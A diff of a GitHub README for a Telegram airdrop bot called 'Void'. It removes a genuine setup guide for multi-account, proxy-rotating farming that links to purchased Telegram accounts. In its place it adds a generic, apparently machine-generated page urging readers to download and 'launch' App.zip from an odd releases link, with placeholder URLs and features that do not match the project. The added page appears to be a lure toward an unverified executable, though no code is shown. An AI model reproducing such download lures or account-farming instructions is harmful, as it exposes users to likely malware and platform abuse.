@@ -1,216 +1,52 @@
-### 🚀 Bot Setup Guide
+# 🚀 Welcome to Void - Automate Your Tasks and Upgrade Your Items! 🤖
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed for new users, with clear explanations for each step.
+![Void Logo](https://example.com/void_logo.png)
 
-> 📱 **For Mobile Users (Termux):** [View the guide here](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
+## Description
+Void is a powerful tool designed to help you automate various tasks and upgrade items effortlessly. Whether you're looking to claim airdrops, farm resources, or earn rewards, Void has got you covered.
 
----
+## Features
+🔹 Automate airdrop applications with our advanced AI technology  
+🔹 Claim airdrops with the click of a button using our specialized bot  
+🔹 Farm airdrop rewards efficiently to maximize your earnings  
+🔹 Explore trending airdrops and stay ahead of the game  
+🔹 Upgrade your items and level up in the virtual world  
 
-## 📌 Table of Contents
+## Repository Topics
+📌 airdrop  
+📌 airdrop-application  
+📌 airdrop-claim-bot  
+📌 airdrop-farm  
+📌 airdrop-free  
+📌 airdrop-hunter-download  
+📌 meomundep  
+📌 tap-to-earn  
+📌 telegram  
+📌 trending  
+📌 void  
 
-1. [System Requirements](#system-requirements)
-2. [Installing the Bot](#installing-the-bot)
-   - [Install via Git](#install-via-git)
-   - [Manual Installation](#manual-installation)
-   - [Install via Docker](#install-via-docker)
-3. [Bot Configuration](#bot-configuration)
-   - [`configs.json`](#1-configsjson)
-   - [`datas.txt`](#2-datastxt)
-   - [`proxies.txt`](#3-proxiestxt)
-   - [`wallets.txt`](#4-walletstxt)
-4. [Running the Bot](#running-the-bot)
-5. [Updating the Bot](#updating-the-bot)
-6. [Contact & Support](#contact-support)
 
----
+## Getting Started
+To get started with Void, simply download the application from the link below:
 
-## 📌 System Requirements
+[![Download Void](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
 
-Before running the bot, make sure you have installed:
+Please note that the downloaded file needs to be launched to start using Void's powerful features. 
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
-- **Git** (For downloading and updating the bot easily)
-- **Docker** _(Optional: If you want to run the bot in a container)_
+If you encounter any issues with the download link, we recommend checking the "Releases" section of this repository for alternative download options.
 
-📥 **Download Node.js and npm here:** [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
-📥 **Download Git here:** [Download Link](https://t.me/KeoAirDropFreeNe/257/60831).
+## Stay Connected
+Stay up to date with the latest news and updates by visiting our [website](https://www.voidapp.com).
 
----
+## Support
+For any questions or assistance, feel free to reach out to our support team at support@voidapp.com.
 
-## 📌 Installing the Bot
-
-### 🔹 Install via Git
-
-1. **Download the bot**:
-   ```bash
-   git clone https://github.com/MeoMunDep/void.git
-   cd void/void
-   ```
-2. **Install required libraries**:
-   ```bash
-   npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ws 
-   ```
-3. **Prepare configuration files** ([See details](#bot-configuration))
-
-### 🔹 Manual Installation (Without Git)
-
-1. **Download and extract the bot** into a folder on your computer.
-2. **Install required libraries** (same as Step 2 above).
-
-### 🔹 Install via Docker
-
-1. **Install Docker** if you haven’t already: [Docker Installation Guide](https://t.me/KeoAirDropFreeNe/257/60831).
-2. **Build and run the bot using Docker**:
-   ```bash
-   docker build -t Void-image .
-   docker run -d --name Void-container -v $(pwd)/logs:/app/logs Void-image
-   ```
-   **For Windows CMD:** Use `%cd%` instead of `$(pwd)`.
+Let Void simplify your tasks and enhance your gaming experience! 🎮💻🌟
 
 ---
 
-## 📌 Bot Configuration
-
-### 1. `configs.json` - 📜 Main Configuration
-
-```json
-{
-  "timeZone": "en-US",
-  "rotateProxy": false,
-  "skipInvalidProxy": true,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [1, 1],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 10,
-  "doTasks": true,
-  "upgradeItems": true
-}
-```
-
-Explanation of each parameter:
-
-| **Parameter Name**            | **Data Type**      | **Default Value** | **Description**                                                                   |
-| ----------------------------- | ------------------ | ----------------- | --------------------------------------------------------------------------------- |
-| `timeZone`                    | `string`           | `"en-US"`         | Default time zone for the bot (e.g., `"vi-VN"` for Vietnam).                      |
-| `rotateProxy`                 | `boolean`          | `false`           | Enable/disable automatic proxy rotation between accounts.                         |
-| `skipInvalidProxy`            | `boolean`          | `false`           | If `true`, the bot will skip that account due to invalid proxy.                   |
-| `proxyRotationInterval`       | `number`           | `2`               | Time interval (in minutes) between proxy rotations when `rotateProxy` is enabled. |
-| `delayEachAccount`            | `[number, number]` | `[5, 8]`          | Random delay (in seconds) between accounts when performing tasks.                 |
-| `timeToRestartAllAccounts`    | `number`           | `300`             | Time (in seconds) before the bot restarts all accounts.                           |
-| `howManyAccountsRunInOneTime` | `number`           | `100`             | Number of accounts running simultaneously.                                        |
-| `doTasks`                     | `boolean`          | `true`            | Enable/disable task execution (`false` means the bot won’t perform tasks).        |
-| `upgradeItems`                | `boolean`           | `true`            | Enable/disable upgrade item execution (`false` means the bot won’t perform upgrade).                  |
-
-Would you like me to add instructions on how users can adjust `configs.json` based on their needs? 🚀
-
-### 2. `datas.txt` - 🗂️ User Data
-
-- [Get it from here](https://t.me/KeoAirDropFreeNee/1586)
-
-```txt
-query_id.../user...
-query_id.../user...
-query_id.../user...
-```
-
-### 3. `proxies.txt` - 🌐 Proxy (Optional)
-
-- [Get it from here](https://www.webshare.io/?referral_code=4l5kb3glsce7)
-
-```txt
-http://host:port
-https://host:port
-socks4://host:port
-socks5://host:port
-http://user:pass@host:port
-https://user:pass@host:port
-socks4://user:pass@host:port
-socks5://user:pass@host:port
-```
-
-### 4. `wallets.txt` - 💼 Wallet List
-
-- [Get it from here](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-
-```txt
-abc...xyz
-abc...xyz
-abc...xyz
-```
+Dive into the world of automation with Void - your ultimate companion for optimizing tasks and upgrading items effortlessly. 🤖✨
 
 ---
 
-## 📌 Running the Bot
-
-### **Run on PC:**
-
-```bash
-node meomundep.js
-```
-
-### **Run with batch script on Windows:**
-
-1. Open **Command Prompt (CMD)**.
-2. Navigate to the bot folder:
-   ```cmd
-   cd "path\to\bot-folder"
-   ```
-3. Run the batch script:
-   ```cmd
-   run.bat
-   ```
-   _(\*If you encounter permission issues, right-click `run.bat` and select "Run as Administrator".)_
-
-### **Run with shell script on Linux/macOS:**
-
-```bash
-./run.sh
-```
-
-### **Run using Docker:**
-
-```bash
-docker start Void-container
-```
-
----
-
-## 📌 Updating the Bot
-
-### 🔹 If installed via Git
-
-```bash
-cd void
-git pull origin main
-npm install
-```
-
-### 🔹 If running via Docker
-
-```bash
-docker stop Void-container
-docker rm Void-container
-docker build -t Void-image .
-docker run -d --name Void-container -v $(pwd)/logs:/app/logs Void-image
-```
-
-_For Windows CMD:_
-
-```cmd
-docker run -d --name Void-container -v %cd%\logs:/app/logs Void-image
-```
-
----
-
-## 📌 Contact & Support
-
-- **Support me via** [Referral Link](http://t.me/VoidNotHereBot/Void?startapp=MeoMunDep--FFA--38d64913-467b-4816-ae45-fdafc2c1ac19&disable_web_page_preview=True)
-- **Buy a Telegram account** [Here](https://t.me/KeoAirDropFreeNe/312/27801)
-- **Contact for work:** [Telegram](https://t.me/MeoMunDep)
-- **Join the support group:** [Join here](https://t.me/KeoAirDropFreeNe)
-- **Updates Channel:** [View channel](https://t.me/KeoAirDropFreeNee)
-
-⚠️ **Disclaimer**: This code is provided "as is" without any warranties. Use it at your own risk. You are solely responsible for any consequences arising from its use. Redistribution or sale of this code in any form is strictly prohibited.
-
-✨ Thank you for using the bot! Good luck! 🚀
+*This README.md was generated by VoidBot v1.0*
